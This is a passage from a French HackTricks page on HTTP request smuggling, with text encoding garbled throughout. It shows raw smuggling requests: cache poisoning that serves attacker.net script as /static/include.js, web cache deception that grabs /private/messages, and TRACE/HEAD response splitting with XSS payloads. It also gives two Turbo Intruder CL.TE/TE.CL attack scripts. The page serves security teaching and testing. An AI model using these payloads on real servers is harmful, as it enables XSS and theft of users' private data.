Voici une illustration de l'exploitation du **poisoning de cache combinÃ© avec une redirection sur site vers une redirection ouverte**. L'objectif est de modifier le contenu du cache de `/static/include.js` pour servir du code JavaScript contrÃ´lÃ© par l'attaquant :
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Notez la requÃªte intÃ©grÃ©e ciblant `/post/next?postId=3`. Cette requÃªte sera redirigÃ©e vers `/post?postId=4`, utilisant la **valeur de l'en-tÃªte Host** pour dÃ©terminer le domaine. En modifiant l'**en-tÃªte Host**, l'attaquant peut rediriger la requÃªte vers son domaine (**redirection sur site vers redirection ouverte**).

AprÃ¨s un **empoisonnement de socket** rÃ©ussi, une **requÃªte GET** pour `/static/include.js` doit Ãªtre initiÃ©e. Cette requÃªte sera contaminÃ©e par la prÃ©cÃ©dente requÃªte **redirection sur site vers redirection ouverte** et rÃ©cupÃ©rera le contenu du script contrÃ´lÃ© par l'attaquant.

Par la suite, toute requÃªte pour `/static/include.js` servira le contenu mis en cache du script de l'attaquant, lanÃ§ant ainsi une large attaque XSS.

### Utiliser le HTTP request smuggling pour effectuer une tromperie de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Quelle est la diffÃ©rence entre l'empoisonnement de cache web et la tromperie de cache web ?**
>
> * Dans l'**empoisonnement de cache web**, l'attaquant amÃ¨ne l'application Ã  stocker un contenu malveillant dans le cache, et ce contenu est servi depuis le cache Ã  d'autres utilisateurs de l'application.
> * Dans la **tromperie de cache web**, l'attaquant amÃ¨ne l'application Ã  stocker un contenu sensible appartenant Ã  un autre utilisateur dans le cache, et l'attaquant rÃ©cupÃ¨re ensuite ce contenu depuis le cache.

L'attaquant crÃ©e une requÃªte de contournement qui rÃ©cupÃ¨re un contenu sensible spÃ©cifique Ã  l'utilisateur. ConsidÃ©rez l'exemple suivant :
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Si cette requÃªte de contournement empoisonne une entrÃ©e de cache destinÃ©e Ã  du contenu statique (par exemple, `/someimage.png`), les donnÃ©es sensibles de la victime provenant de `/private/messages` pourraient Ãªtre mises en cache sous l'entrÃ©e de cache du contenu statique. Par consÃ©quent, l'attaquant pourrait potentiellement rÃ©cupÃ©rer ces donnÃ©es sensibles mises en cache.

### Abus de TRACE via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**Dans cet article**](https://portswigger.net/research/trace-desync-attack), il est suggÃ©rÃ© que si le serveur a la mÃ©thode TRACE activÃ©e, il pourrait Ãªtre possible de l'abuser avec un HTTP Request Smuggling. Cela est dÃ» au fait que cette mÃ©thode renverra tout en-tÃªte envoyÃ© au serveur comme partie du corps de la rÃ©ponse. Par exemple :
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Je vais envoyer une rÃ©ponse telle que :
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Un exemple sur la faÃ§on d'abuser de ce comportement serait de **faire passer d'abord une requÃªte HEAD**. Cette requÃªte sera rÃ©pondue uniquement avec les **en-tÃªtes** d'une requÃªte GET (**`Content-Type`** parmi eux). Et faire passer **immÃ©diatement aprÃ¨s le HEAD une requÃªte TRACE**, qui sera **rÃ©flÃ©chissant les donnÃ©es envoyÃ©es**.\
Comme la rÃ©ponse HEAD contiendra un en-tÃªte `Content-Length`, la **rÃ©ponse de la requÃªte TRACE sera traitÃ©e comme le corps de la rÃ©ponse HEAD, rÃ©flÃ©chissant donc des donnÃ©es arbitraires** dans la rÃ©ponse.\
Cette rÃ©ponse sera envoyÃ©e Ã  la prochaine requÃªte sur la connexion, donc cela pourrait Ãªtre **utilisÃ© dans un fichier JS mis en cache par exemple pour injecter du code JS arbitraire**.

### Abuser de TRACE via le dÃ©coupage de rÃ©ponse HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Continuer Ã  suivre [**ce post**](https://portswigger.net/research/trace-desync-attack) est suggÃ©rÃ© comme une autre faÃ§on d'abuser de la mÃ©thode TRACE. Comme commentÃ©, faire passer une requÃªte HEAD et une requÃªte TRACE il est possible de **contrÃ´ler certaines donnÃ©es rÃ©flÃ©chies** dans la rÃ©ponse Ã  la requÃªte HEAD. La longueur du corps de la requÃªte HEAD est essentiellement indiquÃ©e dans l'en-tÃªte Content-Length et est formÃ©e par la rÃ©ponse Ã  la requÃªte TRACE.

Par consÃ©quent, la nouvelle idÃ©e serait que, sachant ce Content-Length et les donnÃ©es fournies dans la rÃ©ponse TRACE, il est possible de faire en sorte que la rÃ©ponse TRACE contienne une rÃ©ponse HTTP valide aprÃ¨s le dernier octet du Content-Length, permettant Ã  un attaquant de contrÃ´ler complÃ¨tement la requÃªte Ã  la prochaine rÃ©ponse (ce qui pourrait Ãªtre utilisÃ© pour effectuer un empoisonnement de cache).

Exemple :
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Will generate these responses (note how the HEAD response has a Content-Length making the TRACE response part of the HEAD body and once the HEAD Content-Length ends a valid HTTP response is smuggled):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(â€œarbitrary responseâ€)</script>
```
### Armer le HTTP Request Smuggling avec la dÃ©synchronisation de la rÃ©ponse HTTP

Avez-vous trouvÃ© une vulnÃ©rabilitÃ© de HTTP Request Smuggling et vous ne savez pas comment l'exploiter ? Essayez ces autres mÃ©thodes d'exploitation :

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### Autres techniques de HTTP Request Smuggling

* HTTP Request Smuggling dans le navigateur (CÃ´tÃ© client)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* Request Smuggling dans les rÃ©trogradations HTTP/2

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## Scripts Turbo intruder

### CL.TE

Depuis [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De : [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Outils

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer) : Cet outil est un fuzzer HTTP basÃ© sur la grammaire utile pour trouver des incohÃ©rences Ã©tranges dans le request smuggling.

## RÃ©fÃ©rences

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
* [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* VÃ©rifiez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dÃ©pÃ´ts github.

</details>
{% endhint %}
